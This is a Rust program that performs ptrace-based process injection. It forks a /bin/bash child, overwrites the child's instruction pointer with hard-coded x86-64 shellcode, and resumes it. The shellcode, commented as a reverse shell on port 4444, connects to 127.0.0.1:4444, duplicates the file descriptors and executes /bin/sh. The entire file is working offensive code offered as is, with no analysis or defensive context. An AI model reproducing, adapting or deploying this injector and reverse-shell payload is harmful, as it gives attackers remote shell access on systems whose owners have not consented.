use std::ffi::{c_void, CStr, CString};
use nix::{sys::{ptrace::{detach, getregs, traceme, write, AddressType}, wait::waitpid}, unistd::{execv, fork, ForkResult}};

// Reverse shell Shellcode on 4444
const SHELLCODE: [u8; 74] = [
                               106, 41, 88, 153, 106, 2, 95, 106, 1, 94, 15, 5, 72, 151, 72, 185, 2, 0, 17,
                               92, 127, 0, 0, 1, 81, 72, 137, 230, 106, 16, 90, 106, 42, 88, 15, 5, 106, 3,
                               94, 72, 255, 206, 106, 33, 88, 15, 5, 117, 246, 106, 59, 88, 153, 72, 187, 47,
                               98, 105, 110, 47, 115, 104, 0, 83, 72, 137, 231, 82, 87, 72, 137, 230, 15, 5                          
                            ];

fn main() {
    
    let fork_result = unsafe { fork().expect("Failed to fork") };

    match fork_result {

        ForkResult::Parent { child } => {

                                            // Wait signal for ptrace manipulation
                                            waitpid(child, None).expect("Failed to wait");

                                            // Getting register for child process
                                            let mut rip = getregs(child).expect("Could not get child's registers").rip as u64;

                                            // Writing Shellcode to Process RIP register
                                            for byte in SHELLCODE.iter() {
                                                unsafe { write(child, rip as AddressType, *byte as *mut c_void).unwrap(); }
                                                rip += 1;
                                            }

                                            // Detach with no signal from the process to resume execution
                                            detach(child, None).expect("Failed to detach");
                                        }

        ForkResult::Child => {
                                // Indicates that this process is traceable 
                                traceme().expect("Failed to call traceme in child");

                                // Replace current process with a new one. ("/bin/bash")
                                let path = &CString::new("/bin/bash").unwrap();
                                let argument: &[&CStr; 0] = &[];
                                execv(path, argument).unwrap();
                                unreachable!("Execv should have replaced the program")
                            }
    }    
}

